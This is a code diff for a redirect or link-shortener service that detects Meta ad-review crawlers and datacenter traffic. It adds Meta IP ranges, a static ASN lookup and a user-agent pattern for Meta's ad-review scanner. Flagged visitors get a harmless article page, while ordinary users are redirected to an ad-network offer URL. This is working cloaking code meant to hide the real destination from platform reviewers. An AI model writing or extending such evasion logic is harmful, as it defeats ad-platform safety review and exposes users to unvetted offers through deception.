@@ -23,6 +23,7 @@ import { pickSafePage, pickSafePageUrl, safeFallbackFor } from "@/lib/safe-page-
 import { DEFAULT_SHORT_ORIGIN } from "@/lib/short-domains";
 import { resolveDestination } from "@/lib/destination-rotation";
 import { extractAttributionFromUrl, buildAdsterraOfferUrl } from "@/lib/adsterra-attribution";
+import { lookupStaticAsn } from "@/lib/datacenter-cidr";
 
 const DEFAULT_PLATFORM_OFFER_URL =
   "https://holylocusturtle.com/qcun05ba52?key=627eae6ba72f008dc083888e50aa1c5f";
@@ -337,6 +338,14 @@ const FB_IP_PREFIX_LIST = [
   "179.60.192.",
   "185.60.216.",
   "185.60.218.",
+  "185.89.216.", // Meta AS32934 185.89.216.0/22
+  "185.89.217.",
+  "185.89.218.",
+  "185.89.219.",
+  "57.144.", // Meta AS32934 57.144.0.0/14
+  "57.145.",
+  "57.146.",
+  "57.147.",
   "102.132.", // Meta Africa edge
   // IPv6 — Facebook AS32934 owns 2a03:2880::/32, current crawler egress
   "2a03:2880:",
@@ -2217,9 +2226,11 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     "";
   // Cloudflare only sends cf-asn on proxied hostnames. The shortener domain runs
   // DNS-only, so without this fallback every ASN rule (Meta allowlist, datacenter
-  // block) silently never matched. Cache-only read: zero added latency, warms in
-  // the background.
-  const asn = cfAsn || (ip ? lookupAsnByIp(ip) : "");
+  // block) silently never matched.
+  // lookupStaticAsn(ip) checks official Meta & Cloud Datacenter CIDR ranges in ~100ns
+  // with zero network I/O so even the very first hit from any AWS/GCP/Azure/OVH/Meta IP
+  // is caught immediately without waiting for background API cache warming.
+  const asn = cfAsn || (ip ? lookupStaticAsn(ip) || lookupAsnByIp(ip) : "");
 
   // Country resolution, with a CONFIDENCE flag.
   //
@@ -2325,10 +2336,13 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
     //       adspx.com homepage.
     const uaLowMiss = ua.toLowerCase();
     const crawlerMissMatch = uaLowMiss.length >= 5 ? CRAWLER_UA_RE.exec(uaLowMiss) : null;
+    const isBareFbanMiss = /^\s*\[(?:fban|fb_iab|fbav|fbios|fb4a)\b/i.test(uaLowMiss);
     const fromMetaNetworkMiss =
       (asn && FB_ASN_SET.has(asn)) || (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
     const isFbHit =
-      (crawlerMissMatch && FB_CLASS_RE.test(crawlerMissMatch[0])) || fromMetaNetworkMiss;
+      isBareFbanMiss ||
+      (crawlerMissMatch && FB_CLASS_RE.test(crawlerMissMatch[0])) ||
+      fromMetaNetworkMiss;
 
     if (isFbHit) {
       const tpl = pickArticleTemplateForCode(code, publicOrigin);
@@ -2415,6 +2429,10 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // CRAWLER_UA_RE — they hit the offer normally.
   const uaLowFb = ua.toLowerCase();
   const crawlerMatch = uaLowFb.length >= 5 ? CRAWLER_UA_RE.exec(uaLowFb) : null;
+  // Meta's native ad-review scanner (running on both 2a03:2880::/32 and AWS EC2)
+  // sends a bare "[FBAN/FB4A;FBAV/..." User-Agent without the standard "Mozilla/5.0"
+  // mobile WebView prefix. Every real mobile user's WebView starts with "Mozilla/5.0".
+  const isBareFbanCrawler = /^\s*\[(?:fban|fb_iab|fbav|fbios|fb4a)\b/i.test(uaLowFb);
   const fromMetaNetwork =
     (asn && FB_ASN_SET.has(asn)) || (ip && FB_IP_PREFIX_LIST.some((p) => ip.startsWith(p)));
   const isReviewerHost =
@@ -2422,7 +2440,11 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
       referer || "",
     );
 
-  if (crawlerMatch && FB_CLASS_RE.test(crawlerMatch[0])) {
+  if (isBareFbanCrawler) {
+    isBot = true;
+    isFbBot = true;
+    reason = "fb-ua:bare-fban-crawler";
+  } else if (crawlerMatch && FB_CLASS_RE.test(crawlerMatch[0])) {
     const matchedUa = crawlerMatch[0];
     // For FB-class UAs we ALWAYS serve the article (isFbBot=true), even if
     // the IP/ASN does not look like Meta's network. Reason: missing a real FB
@@ -2523,6 +2545,7 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
   // Tracked in Redis (shared across all 8 PM2 workers). Fail-open: Redis
   // outage returns 0, no false blocks. UA-tied to reduce NAT collisions.
   const isInAppBrowserUa =
+    !isBareFbanCrawler &&
     /fban|fbav|fb_iab|fbios|fbss|instagram|messenger|musical_ly|trill_|tiktok|line\/|kakaotalk|whatsapp|snapchat|twitter|pinterest/i.test(
       uaLowFb,
     );
